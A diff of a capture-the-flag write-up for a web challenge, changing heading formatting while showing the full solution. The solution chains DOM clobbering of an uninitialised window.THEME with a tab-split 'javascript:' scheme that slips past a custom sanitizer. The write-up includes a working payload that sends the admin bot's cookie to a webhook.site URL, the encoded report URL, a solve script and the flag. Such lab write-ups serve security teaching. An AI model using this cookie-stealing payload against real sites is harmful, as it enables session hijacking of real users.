@@ -27,7 +27,7 @@ The goal is to steal the bot's cookie.
 
 The application has four key files:
 
-### `serve.mjs` — The Server
+**`serve.mjs` — The Server**
 
 A minimal Node.js HTTP server that:
 
@@ -44,7 +44,7 @@ const cookie = {
 };
 ```
 
-### `bot.js` — The Admin Bot
+**`bot.js` — The Admin Bot**
 
 Uses headless Chrome via CDP (Chrome DevTools Protocol). It:
 
@@ -53,7 +53,7 @@ Uses headless Chrome via CDP (Chrome DevTools Protocol). It:
 3. Navigates to the submitted URL.
 4. Waits 6 seconds, then closes.
 
-### `spatterguard.js` — The Custom Sanitizer
+**`spatterguard.js` — The Custom Sanitizer**
 
 A tag/attribute allowlist-based HTML sanitizer:
 
@@ -77,7 +77,7 @@ if ((attr.name === 'href' || attr.name === 'src') &&
 }
 ```
 
-### `app.js` — The Frontend Logic
+**`app.js` — The Frontend Logic**
 
 This is where the vulnerability lives:
 
@@ -97,11 +97,7 @@ function main() {
 
 The execution order is critical: first `renderNote()` adds sanitized HTML to the DOM, **then** `applyTheme()` checks `window.THEME`.
 
-## Vulnerability Chain
-
-### Step 1: DOM Clobbering `window.THEME.redirect`
-
-#### What is DOM Clobbering?
+## DOM Clobbering
 
 DOM Clobbering is a technique that exploits a legacy behavior in browsers: **HTML elements with `id` or `name` attributes automatically create properties on the global `window` object** (and on `document`). This is part of the [HTML spec's "named access on the Window object"](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object) — a feature that exists for backward compatibility with ancient web pages.
 
@@ -115,7 +111,7 @@ Then `window.foo` returns that `<img>` element — without any JavaScript having
 
 This becomes a security issue when **JavaScript code reads from `window.*` properties that were never explicitly initialized**. An attacker who can inject HTML (even sanitized HTML that strips all scripts) can "clobber" those properties with DOM elements and influence the code's behavior.
 
-#### Why `app.js` is vulnerable
+**Why `app.js` is vulnerable**
 
 Look at the target code:
 
@@ -132,7 +128,7 @@ The code reads `window.THEME` — but **`THEME` is never defined anywhere in the
 
 But if an attacker can inject an HTML element with `id="THEME"` into the DOM, then `window.THEME` is no longer `undefined` — it's that element. And if `theme.redirect` is truthy, the code navigates the browser to whatever value it holds.
 
-#### Clobbering a nested property (`THEME.redirect`)
+**Clobbering a nested property (`THEME.redirect`)**
 
 The tricky part: we don't just need `window.THEME` to exist — we need `window.THEME.redirect` to be truthy and to resolve to a useful value. A single element like `<a id="THEME">` would make `window.THEME` return the anchor element, but `anchorElement.redirect` is `undefined`.
 
@@ -150,13 +146,13 @@ Now:
 3. `window.THEME.redirect` → the collection's internal `namedItem("redirect")` returns the second anchor (because it has `name="redirect"`).
 4. `window.THEME.redirect` is now a truthy `HTMLAnchorElement`.
 
-#### From element to navigation
+**From element to navigation**
 
 When the code executes `location.href = theme.redirect`, JavaScript needs to convert the `HTMLAnchorElement` to a string. It calls `toString()` on the element, which for anchor elements returns the **resolved `href`** — in this case `http://evil.com`.
 
 So the browser navigates to `http://evil.com`. We have an **attacker-controlled redirect** using nothing but two `<a>` tags with `id` and `name` attributes — no JavaScript injection needed at this stage.
 
-#### Why the sanitizer doesn't stop it
+**Why the sanitizer doesn't stop it**
 
 SpatterGuard explicitly allows:
 - The `<a>` tag (in `ALLOWED_TAGS`)
@@ -164,7 +160,7 @@ SpatterGuard explicitly allows:
 
 These are considered "safe" attributes by most sanitizers. But when combined with code that reads uninitialized `window` properties, they become a gadget for DOM Clobbering. The sanitizer has no way to know that `id="THEME"` is dangerous — it's the application code that created the vulnerability by trusting `window.THEME` without initializing it.
 
-#### The full clobbering chain
+**The full clobbering chain**
 
 ```
 Injected HTML:  <a id=THEME></a><a id=THEME name=redirect href="..."></a>
@@ -185,7 +181,7 @@ location.href = theme.redirect  →  anchor2.toString()  →  "..."
 
 ![XSS alert triggered via DOM Clobbering + tab bypass](/img/dexnote-alert.png)
 
-### Step 2: Bypassing SpatterGuard's Scheme Check
+## Bypassing SpatterGuard
 
 The sanitizer's regex to detect dangerous schemes is:
 
@@ -210,7 +206,7 @@ This means:
 2. `element.href` (the getter) = `"javascript:alert(1)"` → tab is stripped by the URL parser.
 3. `location.href = element` → `toString()` returns the resolved href → **JavaScript executes**.
 
-### Step 3: Cookie Exfiltration
+## Cookie Exfiltration
 
 Combining both techniques, we craft a payload that:
 
@@ -220,15 +216,11 @@ Combining both techniques, we craft a payload that:
 
 ## Exploit
 
-### Payload
-
 The raw HTML (the whitespace between `java` and `script` is a literal tab character `0x09`):
 
 ```html
 <a id=THEME></a><a id=THEME name=redirect href="java	script:document.location='https://webhook.site/TOKEN/log?c='+encodeURIComponent(document.cookie)"></a>
 ```
-
-### Final URL
 
 URL-encode the payload into the hash fragment and submit it to the bot via `/report`:
 
@@ -236,7 +228,7 @@ URL-encode the payload into the hash fragment and submit it to the bot via `/rep
 http://127.0.0.1:8080/#note=%3Ca%20id%3DTHEME%3E%3C%2Fa%3E%3Ca%20id%3DTHEME%20name%3Dredirect%20href%3D%22java%09script%3Adocument.location%3D'https%3A%2F%2Fwebhook.site%2FTOKEN%2Flog%3Fc%3D'%2BencodeURIComponent(document.cookie)%22%3E%3C%2Fa%3E
 ```
 
-### Execution Flow
+**Execution Flow:**
 
 1. Go to `http://CHALLENGE:8080/report`.
 2. Submit the URL above (using `127.0.0.1:8080` as the origin).
@@ -248,7 +240,7 @@ http://127.0.0.1:8080/#note=%3Ca%20id%3DTHEME%3E%3C%2Fa%3E%3Ca%20id%3DTHEME%20na
 8. The bot's browser navigates to our webhook with the flag in the query string.
 9. Check the webhook for the incoming request containing `?c=flag%3DCATF%7B...%7D`.
 
-### Solve Script
+**Solve Script:**
 
 ```python
 import urllib.parse
@@ -272,4 +264,3 @@ print(f"\nCheck {WEBHOOK} for the flag cookie!")
 ```
 CATF{t0n1ght_15_th3_n1ght}
 ```
-
